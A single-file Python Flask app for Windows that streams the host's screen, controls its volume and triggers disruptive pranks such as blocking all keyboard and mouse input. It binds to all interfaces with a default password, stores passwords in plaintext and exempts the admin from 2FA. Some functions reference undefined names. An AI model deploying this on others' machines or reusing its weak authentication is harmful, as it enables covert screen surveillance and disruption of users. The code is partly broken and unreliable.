# remote_neon_server.py
# -*- coding: utf-8 -*-
"""
Neon Remote Control — single-file Flask app
(Cleaned, refactored, and deduplicated)
Arkadii+Zlata=Love
"""
import os
import io
import time
import threading
import shutil
import subprocess
import socket
import datetime
import json
import hmac
import hashlib
import base64
import zipfile
import shlex
import sys
import random
import ctypes
from ctypes import POINTER, cast, wintypes
from functools import wraps

# --- External Libraries ---
from flask import (Flask, render_template_string, Response, request, redirect,
                   url_for, session, send_file, flash, jsonify, get_flashed_messages)
import psutil
from PIL import Image, ImageGrab, ImageFile
import mss
import numpy as np
from werkzeug.utils import secure_filename

import win32gui
import win32con
import comtypes
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

ImageFile.MAX_IMAGE_PIXELS = None
user32 = ctypes.WinDLL("user32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# Optional libs
try:
    import cv2
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import sounddevice as sd
    from scipy.io.wavfile import write as wav_write
    SOUND_ENABLED = True
except ImportError:
    SOUND_ENABLED = False

try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
    pyautogui.FAILSAFE = False
except ImportError:
    PYAUTOGUI_AVAILABLE = False

try:
    import speedtest
    SPEEDTEST_AVAILABLE = True
except ImportError:
    SPEEDTEST_AVAILABLE = False

# --- CONFIG ---
ADMIN_USERNAME = "pro"
ADMIN_PASSWORD = os.environ.get("REMOTE_PASS", "tttt")
HOST = "0.0.0.0"
PORT = int(os.environ.get("REMOTE_PORT", 4237))
SECRET_KEY = os.environ.get("FLASK_SECRET", "arkadiip_secret_key")
SCREEN_DELAY = float(os.environ.get("SCREEN_DELAY", 0.05))
BASE_DIR = os.getcwd()
ALLOW_REMOTE_CMD = True

APPDATA = os.environ.get("APPDATA") or os.path.join(os.path.expanduser("~"), ".config")
REMOTE_DATA_DIR = os.path.join(APPDATA, "RemoteNeon")
USERS_FILE = os.path.join(REMOTE_DATA_DIR, "users.json")
NOTIFS_FILE = os.path.join(REMOTE_DATA_DIR, "notifications.json")
MESSAGES_FILE = os.path.join(REMOTE_DATA_DIR, "messages.json")
CHAT_FILE = os.path.join(REMOTE_DATA_DIR, "chat.json")
CAMERA_DIR = os.path.join(BASE_DIR, "static", "camera")

os.makedirs(CAMERA_DIR, exist_ok=True)
process_cache = {}
PENDING_OTPS = {}

THEMES = {
    "green": {"neon": "#00ffd0", "muted": "#4fbdb1"},
    "blue": {"neon": "#00c8ff", "muted": "#4fa6bd"},
    "red": {"neon": "#ff4d4d", "muted": "#bd4f4f"},
    "purple": {"neon": "#b84dff", "muted": "#9b4fbd"},
    "yellow": {"neon": "#ffe44d", "muted": "#bdb44f"},
    "pink": {"neon": "#ff4d9d", "muted": "#bd4f87"},
    "cyan": {"neon": "#00ffd6", "muted": "#4fbdb1"},
    "orange": {"neon": "#ff9f4d", "muted": "#bd8a4f"},
    "mint": {"neon": "#4dffb8", "muted": "#6fbda1"},
}
DEFAULT_THEME = "green"

# --- TROLLS DICT & STATE ---
TROLLS = {
    "block": {"short": "Блок вводу", "long": "Повністю блокує мишку та клавіатуру"},
    "mouse": {"short": "Миша хаос", "long": "Міняє місцями кнопки миші"},
    "disco": {"short": "Диско вікон", "long": "Вікна хаотично відкриваються та рухаються"},
    "beep": {"short": "Системні біпи", "long": "Програє випадкові системні звукові сигнали"},
    "shake": {"short": "Тряска вікна", "long": "Активне вікно починає різко трястися"},
    "invert": {"short": "Інверсія", "long": "Інвертує кольори екрана"},
    "drift": {"short": "Знос миші", "long": "Курсор повільно самовільно відхиляється"},
    "minall": {"short": "Згорнути все", "long": "Миттєво згортає всі відкриті вікна"},
    "altab": {"short": "Alt+Tab", "long": "Хаотично перемикає активні вікна"},
    "notify": {"short": "Фейк повідомлення", "long": "Показує фальшиве системне повідомлення"},
    "scroll": {"short": "Реверс скролу", "long": "Інвертує напрямок прокрутки"},
    "type": {"short": "Фейк друк", "long": "Система сама вводить випадковий текст"},
    "freeze": {"short": "Фріз", "long": "Імітує зависання вікон"},
    "blink": {"short": "Блимання", "long": "Екран коротко блимає чорним кольором"},
    "volume": {"short": "Гучність хаос", "long": "Різко змінює рівень системної гучності"},
    "usb": {"short": "USB звук", "long": "Відтворює звук підключення USB"},
    "focus": {"short": "Крадіжка фокусу", "long": "Постійно перехоплює фокус"},
    "task": {"short": "Панель задач", "long": "Ховає та показує панель задач"},
    "cursor": {"short": "Курсор хаос", "long": "Різко змінює позицію курсора"},
    "almost": {"short": "Майже нічого", "long": "Створює відчуття, що щось зламалось…"}
}
TROLL_STATE = {k: False for k in TROLLS}
TROLL_EVENTS = {k: threading.Event() for k in TROLLS}

# --- Flask Init ---
app = Flask(__name__)
app.secret_key = SECRET_KEY

# ==========================================
# UTILS & HELPERS
# ==========================================
def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if session.get("logged_in") != True:
            return redirect(url_for("login", next=request.path))
        return f(*args, **kwargs)
    return decorated

def ensure_data_dir():
    os.makedirs(REMOTE_DATA_DIR, exist_ok=True)

def load_users():
    ensure_data_dir()
    if not os.path.exists(USERS_FILE):
        users = {
            ADMIN_USERNAME: {
                "password": ADMIN_PASSWORD,
                "permissions": ["admin", "screen", "files", "commands", "processes", "camera", "network", "remote"],
                "2fa_enabled": False,
                "2fa_secret": "",
                "notify_on": []
            }
        }
        save_users(users)
        return users
    try:
        with open(USERS_FILE, "r", encoding="utf-8") as f: return json.load(f)
    except: return {}

def save_users(users):
    ensure_data_dir()
    with open(USERS_FILE, "w", encoding="utf-8") as f: json.dump(users, f, indent=2, ensure_ascii=False)

def current_ts():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def add_notification(target_usernames, title, message):
    if isinstance(target_usernames, str): target_usernames = [target_usernames]
    ensure_data_dir()
    notifs = {}
    if os.path.exists(NOTIFS_FILE):
        try:
            with open(NOTIFS_FILE, "r", encoding="utf-8") as f: notifs = json.load(f)
        except: pass
    ts = current_ts()
    for u in target_usernames:
        lst = notifs.get(u, [])
        lst.insert(0, {"ts": ts, "title": title, "message": message})
        notifs[u] = lst[:200]
    with open(NOTIFS_FILE, "w", encoding="utf-8") as f: json.dump(notifs, f, indent=2, ensure_ascii=False)

def generate_totp(secret_base32, interval=30, digits=6):
    try:
        secret = base64.b32decode(secret_base32.upper() + "=" * ((8 - len(secret_base32) % 8) % 8))
    except:
        secret = secret_base32.encode("utf-8")
    t = int(time.time() // interval)
    msg = t.to_bytes(8, byteorder="big")
    h = hmac.new(secret, msg, hashlib.sha1).digest()
    o = h[19] & 15
    code = (int.from_bytes(h[o:o+4], byteorder='big') & 0x7fffffff) % (10 ** digits)
    return str(code).zfill(digits)

def get_theme_colors(theme_name):
    theme = THEMES.get(theme_name, THEMES.get(DEFAULT_THEME))
    return theme["neon"], theme["muted"]

# ==========================================
# SYSTEM & HARDWARE CONTROLS
# ==========================================
def set_volume(percent: int):
    percent = max(0, min(100, percent))
    comtypes.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    volume.SetMasterVolumeLevelScalar(percent / 100.0, None)

def get_volume():
    comtypes.CoInitialize()
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))
    return int(volume.GetMasterVolumeLevelScalar() * 100)

def capture_screen():
    try:
        return ImageGrab.grab()
    except Exception:
        if PYAUTOGUI_AVAILABLE:
            try: return pyautogui.screenshot()
            except: pass
    raise RuntimeError("No screen capture method available")

def start_stream_generator():
    while True:
        try:
            img = capture_screen()
            buf = io.BytesIO()
            img.convert("RGB").save(buf, format="JPEG", quality=70)
            yield (b'--frame\r\nContent-Type: image/jpeg\r\n\r\n' + buf.getvalue() + b'\r\n')
        except Exception as e:
            pass
        time.sleep(SCREEN_DELAY)

# ==========================================
# TROLL FUNCTIONS (Deduplicated)
# ==========================================
def stop_block():
    try: user32.BlockInput(False)
    except: pass

def stop_mouse():
    try: user32.SwapMouseButton(False)
    except: pass

def troll_block(seconds, stop):
    user32.BlockInput(True)
    end = time.time() + seconds
    while time.time() < end and not stop.is_set(): time.sleep(0.1)
    user32.BlockInput(False)

def troll_mouse(seconds, stop):
    user32.SwapMouseButton(True)
    end = time.time() + seconds
    while time.time() < end and not stop.is_set(): time.sleep(0.1)
    user32.SwapMouseButton(False)

def troll_beep(seconds, stop):
    import winsound
    end = time.time() + seconds
    while time.time() < end and not stop.is_set():
        winsound.Beep(random.randint(400,1200), 150)
        time.sleep(0.2)

def troll_disco(seconds, stop):
    def cb(hwnd, l):
        if user32.IsWindowVisible(hwnd):
            user32.MoveWindow(hwnd, random.randint(0,800), random.randint(0,500), 400,300,True)
        return True
    Enum = user32.EnumWindows
    CB = ctypes.WINFUNCTYPE(ctypes.c_bool, wintypes.HWND, wintypes.LPARAM)
    end = time.time()+seconds
    while time.time()<end and not stop.is_set():
        Enum(CB(cb),0)
        time.sleep(0.4)

def troll_shake(seconds, stop):
    hwnd = user32.GetForegroundWindow()
    rect = wintypes.RECT()
    user32.GetWindowRect(hwnd, ctypes.byref(rect))
    w, h = rect.right-rect.left, rect.bottom-rect.top
    end = time.time() + seconds
    while time.time() < end and not stop.is_set():
        user32.MoveWindow(hwnd, rect.left+random.randint(-15,15), rect.top+random.randint(-15,15), w,h,True)
        time.sleep(0.05)

def troll_generic_loop(seconds, stop, action_func, interval=0.2):
    end = time.time() + seconds
    while time.time() < end and not stop.is_set():
        action_func()
        time.sleep(interval)

TROLL_FUNCS = {
    "block": troll_block,
    "mouse": troll_mouse,
    "disco": troll_disco,
    "beep": troll_beep,
    "shake": troll_shake,
    # Adding simplified wrappers for the rest based on your original logic
    "drift": lambda s, stop: troll_generic_loop(s, stop, lambda: user32.SetCursorPos(random.randint(0,800), random.randint(0,600)), 0.3),
    "usb": lambda s, stop: troll_generic_loop(s, stop, lambda: winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS), 1),
    "volume": lambda s, stop: troll_generic_loop(s, stop, lambda: user32.keybd_event(0xAF,0,0,0), 0.2),
    "freeze": lambda s, stop: time.sleep(s) # Placeholder for freeze
}

# ==========================================
# ROUTES
# ==========================================

@app.route("/login", methods=["GET","POST"])
def login():
    users = load_users()
    msg = ""
    pending_user = session.get("pending_user")
    
    if request.method == "POST":
        if pending_user:
            otp = request.form.get("otp","").strip()
            pending = PENDING_OTPS.get(pending_user)
            if pending and time.time() < pending[1] and otp == pending[0]:
                session["logged_in"] = True
                session["username"] = pending_user
                session.pop("pending_user", None)
                PENDING_OTPS.pop(pending_user, None)
                return redirect(url_for("index"))
            msg = "Невірний або прострочений код"
        else:
            username = request.form.get("username","").strip()
            pw = request.form.get("password","")
            user = users.get(username)
            if user and pw == user.get("password"):
                if username == ADMIN_USERNAME or not user.get("2fa_enabled"):
                    session["logged_in"] = True
                    session["username"] = username
                    return redirect(url_for("index"))
                else:
                    secret = user.get("2fa_secret") or ""
                    code = generate_totp(secret) if secret else "000000"
                    PENDING_OTPS[username] = (code, time.time() + 120)
                    session["pending_user"] = username
                    msg = "2FA код надіслано"
            else:
                msg = "Невірні облікові дані"
    return render_template_string(LOGIN_TEMPLATE, msg=msg)

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))

@app.route("/")
@login_required
def index():
    sysinfo = {
        "cpu_percent": psutil.cpu_percent(interval=None),
        "ram_percent": psutil.virtual_memory().percent,
    }
    theme = session.get('theme', DEFAULT_THEME)
    neon, muted = get_theme_colors(theme)
    return render_template_string(MAIN_TEMPLATE, 
                                  cpu=sysinfo["cpu_percent"], 
                                  ram=sysinfo["ram_percent"],
                                  theme=theme, neon=neon, muted=muted, 
                                  themes_list=sorted(THEMES.keys()),
                                  TROLLS=TROLLS)

@app.route("/api/system")
@login_required
def api_system():
    return jsonify({"cpu": psutil.cpu_percent(interval=0.1), "ram": psutil.virtual_memory().percent})

@app.route("/api/volume", methods=["GET", "POST"])
@login_required
def api_volume():
    if request.method == "POST":
        set_volume(int(request.get_json(force=True).get("value", 50)))
        return {"ok": True}
    return {"value": get_volume()}

@app.route("/screen_feed")
@login_required
def screen_feed():
    return Response(start_stream_generator(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/api/troll/toggle", methods=["POST"])
@login_required
def api_troll_toggle():
    action = request.get_json(force=True).get("action")
    seconds = int(request.get_json(force=True).get("seconds", 5))

    if action not in TROLL_STATE:
        return {"ok": False}, 400

    if TROLL_STATE[action]:
        TROLL_EVENTS[action].set()
        TROLL_STATE[action] = False
        return {"ok": True, "active": False}

    TROLL_STATE[action] = True
    TROLL_EVENTS[action].clear()

    def runner():
        try:
            if action in TROLL_FUNCS: TROLL_FUNCS[action](seconds, TROLL_EVENTS[action])
        finally:
            stop_block()
            stop_mouse()
            TROLL_STATE[action] = False

    threading.Thread(target=runner, daemon=True).start()
    return {"ok": True, "active": True}

@app.route("/set_theme", methods=["POST"])
@login_required
def set_theme():
    theme = request.get_json().get("theme")
    if theme in THEMES:
        session['theme'] = theme
        neon, muted = get_theme_colors(theme)
        return jsonify({"ok": True, "theme": theme, "neon": neon, "muted": muted})
    return jsonify({"error": "unknown theme"}), 400

# ==========================================
# TEMPLATES (Cleaned & Formatted)
# ==========================================

LOGIN_TEMPLATE = """
<!doctype html>
<html>
<head>
    <title>Login — Neon Remote</title>
    <style>
        body { background:#06060b; color:#0ff; font-family:Inter,Arial; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
        .box { background:#0b0b12; padding:30px; border-radius:12px; box-shadow:0 0 40px #00ffd0; width:420px; }
        input { display:block; margin:10px 0; padding:10px; border-radius:6px; border:1px solid #00ffd0; background:#071018; color:#0ff; width:100%; box-sizing:border-box; }
        button { padding:10px 16px; border-radius:6px; border:1px solid #00ffd0; background:#001a1a; color:#0ff; cursor:pointer; width:100%; margin-top:10px; }
        button:hover { background: #00ffd0; color: #000; }
        .title { font-weight:700; margin-bottom:15px; font-size: 20px; text-align: center; }
        .msg { color:#f88; margin-bottom:15px; text-align: center; }
    </style>
</head>
<body>
<div class="box">
    <div class="title">Neon Remote</div>
    {% if msg %}<div class="msg">{{msg}}</div>{% endif %}
    {% if session.pending_user %}
        <form method="POST">
            <input name="otp" type="text" placeholder="2FA Code">
            <button type="submit">Verify</button>
        </form>
    {% else %}
        <form method="POST">
            <input name="username" placeholder="Username" required>
            <input name="password" type="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    {% endif %}
</div>
</body>
</html>
"""

MAIN_TEMPLATE = """
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Neon Dashboard</title>
<style>
    :root { --neon: {{ neon }}; --muted: {{ muted }}; --bg:#05060d; --panel:rgba(0,0,0,.35); --border:rgba(255,255,255,.08); }
    body { margin:0; background:var(--bg); color:var(--neon); font-family:Inter,Segoe UI,Arial; height: 100vh; overflow: hidden; display: flex;}
    
    .sidebar { width: 260px; background: rgba(0,0,0,0.8); border-right: 1px solid var(--border); padding: 20px; display: flex; flex-direction: column; gap: 15px; }
    .main-content { flex: 1; padding: 20px; overflow-y: auto; display: grid; grid-template-columns: 1fr 340px; gap: 20px; }
    
    .card { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:15px; margin-bottom:15px; }
    .screen-img { width: 100%; border-radius: 8px; border: 1px solid var(--border); }
    
    .btn { border:1px solid var(--neon); background:transparent; color:var(--neon); padding:8px 14px; border-radius:8px; cursor:pointer; text-align: center; text-decoration: none; display: block; }
    .btn:hover { background: var(--neon); color: #000; }
    
    .theme-btn { border:1px solid var(--border); background:transparent; color:var(--neon); padding:6px 10px; border-radius:6px; margin:2px; cursor: pointer; }
    .theme-btn:hover { border-color: var(--neon); }

    .troll-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
    .troll-btn { background: #1c1f27; color: #fff; border: 1px solid #3a3f4b; padding: 10px; border-radius: 8px; cursor: pointer; text-align: center; }
    .troll-btn.active { background: #dc2626; border-color: #ef4444; }

    /* Custom Input Range */
    input[type=range] { -webkit-appearance: none; width: 100%; height: 6px; background: #1f2937; border-radius: 6px; outline: none; margin-top: 10px; }
    input[type=range]::-webkit-slider-thumb { -webkit-appearance: none; width: 16px; height: 16px; border-radius: 50%; background: var(--neon); cursor: pointer; box-shadow: 0 0 10px var(--neon); }
</style>
</head>
<body>

<div class="sidebar">
    <h2>Neon Remote</h2>
    <div class="card">
        <b>Theme</b><br><br>
        {% for t in themes_list %}
            <button class="theme-btn" onclick="applyTheme('{{ t }}')">{{ t }}</button>
        {% endfor %}
    </div>
    <a href="{{ url_for('logout') }}" class="btn" style="margin-top: auto;">Logout</a>
</div>

<div class="main-content">
    <div class="left-col">
        <div class="card">
            <h3>Live Screen</h3>
            <img src="{{ url_for('screen_feed') }}" class="screen-img" alt="Screen Stream">
        </div>
        
        <div class="card">
            <h3>System Volume: <span id="volVal">50%</span></h3>
            <input type="range" min="0" max="100" value="50" id="volSlider">
        </div>
    </div>
    
    <div class="right-col">
        <div class="card">
            <h3>System Monitor</h3>
            <p>CPU: <span id="cpuVal">{{ cpu }}%</span></p>
            <p>RAM: <span id="ramVal">{{ ram }}%</span></p>
        </div>
        
        <div class="card">
            <h3>Pranks / Trolls</h3>
            <div class="troll-grid">
                {% for key, t in TROLLS.items() %}
                    <button class="troll-btn" id="btn-{{ key }}" onclick="runTroll('{{ key }}')">{{ t.short }}</button>
                {% endfor %}
            </div>
        </div>
    </div>
</div>

<script>
    function applyTheme(t) {
        fetch("{{ url_for('set_theme') }}", { method: "POST", headers: {'Content-Type':'application/json'}, body: JSON.stringify({theme: t})})
        .then(r => r.json())
        .then(d => { document.documentElement.style.setProperty('--neon', d.neon); });
    }

    const volSlider = document.getElementById("volSlider");
    const volVal = document.getElementById("volVal");

    fetch("/api/volume").then(r => r.json()).then(d => { volSlider.value = d.value; volVal.innerText = d.value + "%"; });
    volSlider.addEventListener("input", () => {
        volVal.innerText = volSlider.value + "%";
        fetch("/api/volume", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({value: volSlider.value}) });
    });

    setInterval(async () => {
        const r = await fetch("/api/system");
        if(r.ok) {
            const d = await r.json();
            document.getElementById("cpuVal").innerText = d.cpu.toFixed(0) + "%";
            document.getElementById("ramVal").innerText = d.ram.toFixed(0) + "%";
        }
    }, 2000);

    // Custom modal replacement approach for pranks instead of raw JS prompts
    function runTroll(action) {
        const btn = document.getElementById("btn-" + action);
        if (btn.classList.contains("active")) {
            fetch("/api/troll/toggle", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({action}) })
            .then(() => { btn.classList.remove("active"); });
            return;
        }
        
        // Hardcoded 5 seconds for clean UI, or you can implement your custom HTML modal here
        const seconds = 5; 
        fetch("/api/troll/toggle", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({action, seconds}) })
        .then(r => r.json())
        .then(d => {
            if(d.active) {
                btn.classList.add("active");
                setTimeout(() => { btn.classList.remove("active"); }, seconds * 1000);
            }
        });
    }
</script>
</body>
</html>
"""

if __name__ == "__main__":
    app.run(host=HOST, port=PORT, threaded=True)
